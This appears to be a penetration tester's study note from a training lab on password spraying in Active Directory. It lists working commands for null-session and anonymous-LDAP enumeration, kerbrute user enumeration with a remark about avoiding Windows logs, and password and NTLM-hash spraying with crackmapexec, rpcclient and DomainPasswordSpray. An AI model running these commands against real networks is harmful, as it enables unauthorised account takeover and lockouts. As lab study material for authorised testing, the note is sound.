---
tags: [ad, windows, password-spraying, impacket]
aliases: [Password Spraying]
---
Attempting to log into an exposed service using one common password and longer list of usernames or email addreses.

The main concern is locking out hundreds of production accounts. It is also essential to introduce a delay between login attempts. If we do not know the password policy, we should wait a few hours between attempts.

# Retrieving Password Policies

### SMB Null Sessions

With valid domain credentials we can obtain it remotely
```shell
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

Without credentials we obtainit via an SMB NULL session. 
- SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain
	- misconfiguration resulting from legacy DCs being upgrade in place.

```shell
# check a DC for SMB NULL
rpcclient -U "" -N 172.16.5.5

# obtain password policy
rpcclient $> querydominfo

# we can also use enum4linux built around Samba suite tools
enum4linux-ng -P 172.16.5.5
```

We can also enumerate a null session from Windows

```shell
net use \\DC01\ipc$ "" /u:""
```

### LDAP Anonymous Bind

Allows an unauthenticated attacker to retrieve information from the domain such as complete listing of users, groups, computers, user account attributes, and the domain password policy. 

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

If we are authenticated to the domain from a Windows host, we can retrieve the password policy using built-in tools.

```powershell
net accounts

# using PowerView
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

# User Enumeration

To successfully mount a password spraying attack, we first need a list of valid domain users to attempt to authenticate with. 

### SMB NULL Session User List

```shell
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# type enumdomusers after connecting
rpcclient -U "" -N 172.16.5.5

# shows the badpwdcount so we can remove account from our list that are close the lockout threshold
crackmapexec smb 172.16.5.5 --users
```

### LDAP Anonymous

```shell
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Kerberos Pre-Authentication

If we have no access at all from our position in the internal network we can enumerated using Kerbrute. This tool uses Kerberos Pre-Authentication which doesn't generate windows logs. Sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with `PRINCIPAL UNKNOWN`, the username is invalid. `
```shell
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

This technique will however generate event ID 4768: A Kerberos authentication ticket (TGT) was requested if the Kerberos event logging is enabled in group policy. 

# Validate Credentials

## Linux

Once we have our username list we can finally validate which passwords works.

```shell
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

# bash one-liner
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

Internal password spraying can also be attempted across multiple hosts in the network if we have the local administrator account access. Oftentimes local administrator passwords will be reused or formatted similarly. 

```shell
# local admin sprayinh
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Windows

If we have foothold on a domain-joined Windows host, the DomainPasswordSpray tool can be used. It will automatically generated a user list from the AD, query the password policy, and exclude user accounts with one attempt from lockout.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Related

- [[credential-enumeration]]
- [[enumeration]]
- [[kerberoasting]]
- [[05-privilege-escalation/windows/credential-hunting|Credential Hunting]]

